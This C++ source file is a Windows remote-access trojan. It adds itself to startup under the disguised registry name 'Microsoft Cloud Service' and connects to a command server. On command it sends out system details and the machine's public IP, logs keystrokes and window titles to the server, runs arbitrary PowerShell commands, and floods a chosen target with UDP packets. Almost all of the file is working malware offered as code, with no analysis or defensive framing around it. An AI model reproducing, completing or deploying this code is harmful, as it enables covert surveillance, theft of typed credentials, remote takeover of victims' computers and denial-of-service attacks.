//How to peacefully exit Keylogger function
//Incorrect Command sent to powershell


#include <ws2tcpip.h>
#include <stdio.h>
#include <string>
#include <Windows.h>
#include <wininet.h>
#include <iostream>
#include <iphlpapi.h>
#include <stdlib.h>
#include <string.h>
#include <fstream>
#include <vector>
#include <cstring>
#include <thread>
#include <iphlpapi.h>
#include <lmcons.h>
#include <winsock2.h>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "Ws2_32.lib")
using namespace std;

SOCKET clientSocket;
string msg;


//Compiler Command
//g++ 4.cpp -lws2_32 -lwininet -static-libgcc -static-libstdc++ -mwindows


void printCharToServer(char character, SOCKET& socket)
{
	string charStr(1, character);
	send(socket, charStr.c_str(), charStr.size(), 0);
	cout << character;
}

void printStringToServer(string character, SOCKET& socket)
{
	send(socket, character.c_str(), character.size(), 0);
	cout << character;
}

//Check Possibilities for Lowercase Letters
string static lowercase(int key)
{
	if (key == 0x41) { return "a"; }
	if (key == 0x42) { return "b"; }
	if (key == 0x43) { return "c"; }
	if (key == 0x44) { return "d"; }
	if (key == 0x45) { return "e"; }
	if (key == 0x46) { return "f"; }
	if (key == 0x47) { return "g"; }
	if (key == 0x48) { return "h"; }
	if (key == 0x49) { return "i"; }
	if (key == 0x4A) { return "j"; }
	if (key == 0x4B) { return "k"; }
	if (key == 0x4C) { return "l"; }
	if (key == 0x4D) { return "m"; }
	if (key == 0x4E) { return "n"; }
	if (key == 0x4F) { return "o"; }
	if (key == 0x50) { return "p"; }
	if (key == 0x51) { return "q"; }
	if (key == 0x52) { return "r"; }
	if (key == 0x53) { return "s"; }
	if (key == 0x54) { return "t"; }
	if (key == 0x55) { return "u"; }
	if (key == 0x56) { return "v"; }
	if (key == 0x57) { return "w"; }
	if (key == 0x58) { return "x"; }
	if (key == 0x59) { return "y"; }
	if (key == 0x5A) { return "z"; }
}

string static special(int key)
{
	if (key == 0x30) { return ")"; }
	if (key == 0x31) { return "!"; }
	if (key == 0x32) { return "@"; }
	if (key == 0x33) { return "#"; }
	if (key == 0x34) { return "$"; }
	if (key == 0x35) { return "%"; }
	if (key == 0x36) { return "^"; }
	if (key == 0x37) { return "&"; }
	if (key == 0x38) { return "*"; }
	if (key == 0x39) { return "("; }
}

string static otherShift(int key)
{
	if (key == 0xBA) { return ":"; }
	if (key == 0xBB) { return "+"; }
	if (key == 0xBC) { return "<"; }
	if (key == 0xBD) { return "_"; }
	if (key == 0xBE) { return ">"; }
	if (key == 0xBF) { return "?"; }
	if (key == 0xC0) { return "~"; }
	if (key == 0xDB) { return "{"; }
	if (key == 0xDC) { return "|"; }
	if (key == 0xDD) { return "}"; }
	if (key == 0xDE) { return "\""; }
}

string static other(int key)
{
	if (key == 0xBA) { return ";"; }
	if (key == 0xBB) { return "="; }
	if (key == 0xBC) { return ","; }
	if (key == 0xBD) { return "-"; }
	if (key == 0xBE) { return "."; }
	if (key == 0xBF) { return "/"; }
	if (key == 0xC0) { return "`"; }
	if (key == 0xDB) { return "["; }
	if (key == 0xDC) { return "/"; }
	if (key == 0xDD) { return "]"; }
	if (key == 0xDE) { return "\'"; }
}


bool IsSocketConnected(SOCKET socket)
{
	string heartbeat = "_";
	//10057 - Socket Not Connected
	//10054 - Connection Reset by Peer
	if(send(clientSocket, heartbeat.c_str(), heartbeat.size(), 0) == SOCKET_ERROR)
	{
		return false;
	}
	else
	{
		Sleep(10000);
		return true;
	}
	


}

string static getActiveWindowTitle()
{
	char wnd_title[256];
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
	return wnd_title;

}

string static getSystemInfo()
{
	//Computer Processor and Architecture
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	DWORD _processor = sysinfo.dwProcessorType;
	DWORD _processor1 = sysinfo.wProcessorArchitecture;
	string processor = to_string(_processor);
	string processor2 = to_string(_processor1);

	//Computer Name
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	GetComputerNameExA(ComputerNameNetBIOS, computerName, &size);


	//Public Ip
	LPCSTR name = "IP retreiver";
	LPCSTR link = "http://myexternalip.com/raw";


	HINTERNET net = InternetOpen(name,
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET conn = InternetOpenUrl(net,
		link,
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	char buffer[4096];
	DWORD read;

	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
	InternetCloseHandle(net);

	string ip = string(buffer, read);


	string result = "Processor: ";

	for(char x: processor)
	{
		result += x;
	}
	result += "\n";
	result += "Architecture: ";
	for(char x: processor2)
	{
		result += x;
	}
	result += " (9 = x64 AMD or Intel, 5 = ARM, 12 = ARM64, 6 = Intel Itanium - based, 0 = x86)";
	result += "\n";

	result += "System Name: ";
	result += computerName;
	result += "\n";
	result += "Public Ip: ";
	result += ip;
	

	return result;
}

string static getUsername()
{
	char username[UNLEN + 1];
	DWORD length = UNLEN + 1;

	GetUserNameA(username, &length);
	string name = string(username, length);
	return name;

}


boolean static Keylogg(SOCKET clientSocket)
{

		for (int i = 0; i < 256; i++)
		{
			//char buffer[1024];
			//int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
			//string receivedString(buffer, bytesReceived);

			//if(receivedString == "Q")
			//{
			//	return false;
			//}

			if (GetAsyncKeyState(i) & 0b1)
			{
				//Numbers
				if (i >= 0x30 && i <= 0x39)
				{
					if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
					{
						printStringToServer(special(i), clientSocket);
					}
					else
					{
						printCharToServer((char)i, clientSocket);
					}


				}

				//Capital and Lowercase Alphabet
				if (i >= 0x41 && i <= 0x5A)
				{
					if (GetAsyncKeyState(VK_SHIFT))
					{
						printCharToServer((char)i, clientSocket);
					}
					else
					{
						printStringToServer(lowercase(i), clientSocket);
					}
				}

				//Special Keys
				if (i == VK_SPACE) { printStringToServer(" ", clientSocket); }
				if (i == VK_RETURN) { printStringToServer("[RETURN]\n", clientSocket); }

				//Detects new window selected if left mouse is pressed
				if (i == VK_LBUTTON)
				{
					printStringToServer("[LEFT CLICK]\n", clientSocket);
					printStringToServer("New Window Detected: ", clientSocket);
					printStringToServer(getActiveWindowTitle(), clientSocket);
					printStringToServer("\n", clientSocket);
				}


				if (i == VK_RBUTTON) { printStringToServer("[RIGHT CLICK]\n", clientSocket); }
				if (i == VK_BACK) { printStringToServer("[BACKSPACE]", clientSocket); }
				if (i >= 0xBA && i <= 0xDF)
				{
					if (GetAsyncKeyState(VK_SHIFT))
					{
						printStringToServer(otherShift(i), clientSocket);
					}
					else
					{
						printStringToServer(other(i), clientSocket);
					}
				}
			}
		}

	return true;

}

void static powerShell(string userCommand)
{
	if(userCommand.length() > 0 )
	{
		string command = "powershell.exe  -Command \"";
		command += userCommand;
		command += "\"";

		cout << command;

		LPSTR lpCommandLine = const_cast<LPSTR>(command.data());
		STARTUPINFOA startupInfo = { sizeof(startupInfo) };
		PROCESS_INFORMATION processInfo;

		//startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
		//startupInfo.wShowWindow = SW_HIDE;

		int result = CreateProcessA(
			nullptr,
			lpCommandLine,
			nullptr,
			nullptr,
			false,
			0,
			nullptr,
			nullptr,
			&startupInfo,
			&processInfo
		);
		

		WaitForSingleObject(processInfo.hProcess, INFINITE);
		cout << GetLastError() << endl;

		//CloseHandle(processInfo.hProcess);
		//CloseHandle(processInfo.hThread);

	
	}

		
	
	



}

string deHeartbeatString(string str)
{
	string heartbeat = "muzer!@#tyrz";

	int found = str.find("muzer!@#tyrz");
	string newString = "";

	if(found != string::npos)
	{
		newString += str.substr(0, found);
		newString += str.substr((found + heartbeat.length()), str.length());
		return newString;

	}
	else
	{
		return str;
	}

	

	
}

DWORD WINAPI network(LPVOID LpParam)
{
	WSADATA wsaData;

	WORD wVersion = MAKEWORD(2, 2);
	WSAStartup(wVersion, &wsaData);

	// Create a socket
	clientSocket = socket(AF_INET, SOCK_STREAM, 0);

	// Fill in the address structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;

	//Port Number
	hint.sin_port = htons(8089);

	//IP 

	string ipaddress = "127.0.0.1";
	hint.sin_addr.s_addr = inet_addr(ipaddress.c_str());

	//Local Testing
	//inet_pton(AF_INET, "54.167.46.14", &hint.sin_addr);

	//Server Testing
	//inet_pton(AF_INET, "127.0.0.1", &hint.sin_addr);


	

	while(true)
	{
		if(!IsSocketConnected(clientSocket))
		{
			clientSocket = socket(AF_INET, SOCK_STREAM, 0);
			connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
			
		}
	}	Sleep(20);
	


}

DWORD WINAPI listen(LPVOID lpParam)
{
	while(true)
	{
	char buffer[1024];
	int bytes;
	bytes = recv(clientSocket, buffer, sizeof(buffer), 0);
	msg = deHeartbeatString(string(buffer, bytes));
	}

}

void static UDPflood(string info)
{
	WSADATA _wsaData;

	WORD wVersion = MAKEWORD(2, 2);
	WSAStartup(wVersion, &_wsaData);

	SOCKET targetSocket;
	targetSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	
	string payload = "";

	for (int i = 0; i < 4500; i++)
	{
		payload += "aaaaaaaaaaa";
		
	}

	int found = info.find("p");
	int found2 = info.find("c");

	cout << found << endl;
	cout << found2 << endl;

	string _ip = info.substr(0, found);
	string _port = info.substr(found + 1, found2 - found - 1);
	string _count = info.substr(found2 + 1, info.length());

	cout << "ip: " << _ip << endl;
	cout << "port: " << _port << endl;
	cout << "count: " << _count << endl;

	PCSTR ip = _ip.c_str();
	unsigned short port = stoi(_port);
	int count = stoi(_count);




	// Fill in the address structure
	sockaddr_in tar;
	tar.sin_family = AF_INET;

	//Port Number
	tar.sin_port = htons(port);

	//IP 
	//string ipaddress = ip;
	//inet_pton(AF_INET, ip, &tar.sin_addr);
	int bytes;

	string ipaddress =ip;
	tar.sin_addr.s_addr = inet_addr(ipaddress.c_str());


	connect(targetSocket, (sockaddr*)&tar, sizeof(tar));
	cout << WSAGetLastError() << endl;

	string word = "";


	for(int i = 0; i < count; i++)
	{
		bytes = sendto(targetSocket, payload.c_str(), payload.length(), 0, reinterpret_cast<sockaddr*>(&tar), sizeof(tar));
		cout << WSAGetLastError();
		cout << bytes << " bytes sent" << endl;


	}
		
		
	
	


}





int main()
{
	//Adds exe file to system registry to run on startup
	//
	//
	

	wchar_t buffer[MAX_PATH];
	HMODULE hModule = GetModuleHandle(NULL);
	DWORD length = GetModuleFileNameW(hModule, buffer, MAX_PATH);


	wstring localPath(buffer);
	LPCWSTR fullString = localPath.c_str();

	char convertedBuffer[MAX_PATH];
	WideCharToMultiByte(CP_ACP, 0, fullString, -1, convertedBuffer, MAX_PATH, nullptr, nullptr);

	HKEY hKey;

	LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	res = RegSetValueExA(hKey, "Microsoft Cloud Service", 0, REG_SZ, (BYTE*)convertedBuffer, strlen(convertedBuffer) + 1);


	HANDLE hThread = CreateThread(NULL, 0, network, NULL, 0, NULL);


	while (true)
	{
		
		

		char buffer[1024];
		int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		cout << "Home" << endl;	

		if(bytesReceived > 0)
		{

			string receivedString(buffer, bytesReceived);
			string deHeartbeatedString = deHeartbeatString(receivedString);

			//Change test to a complex heartbeat and check if it contains it, if it does, remove it and continue
			if (receivedString != "muzer!@#tyrz")
			{
				
				if (deHeartbeatedString == "A")
				{
					printStringToServer(getSystemInfo(), clientSocket);
				}

				if (receivedString == "B")
				{
					SOCKET keyloggSocket;
					keyloggSocket = socket(AF_INET, SOCK_STREAM, 0);
				
					sockaddr_in info;
					info.sin_family = AF_INET;

					info.sin_port = htons(8088);
					string ip = "127.0.0.1";
					info.sin_addr.s_addr = inet_addr(ip.c_str());


					connect(keyloggSocket, (sockaddr*)&info, sizeof(info));
					cout << WSAGetLastError();

					HANDLE hThread = CreateThread(NULL, 0, listen, NULL, 0, NULL);
					
					cout << "Error code: " << GetLastError() << endl;


					while(msg != "STOP")
					{
						Keylogg(keyloggSocket);
					}

					msg = "";
					closesocket(keyloggSocket);
						

					




					
				}

				if(receivedString == "C")
				{

					bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
					string command = deHeartbeatString(string(buffer, bytesReceived));
					while(command.length() == 0)
					{
						bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
						command = deHeartbeatString(string(buffer, bytesReceived));
					
					}
					
					powerShell(command);
				}

				if(receivedString == "UDP")
				{
					cout << "FLOOD" << endl;
					bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
					string info = deHeartbeatString(string(buffer, bytesReceived));
					UDPflood(info);


					
					

				}

			


			}

		
		}
		
		

		
		
		
	}
		

		


		
	
}

	

	





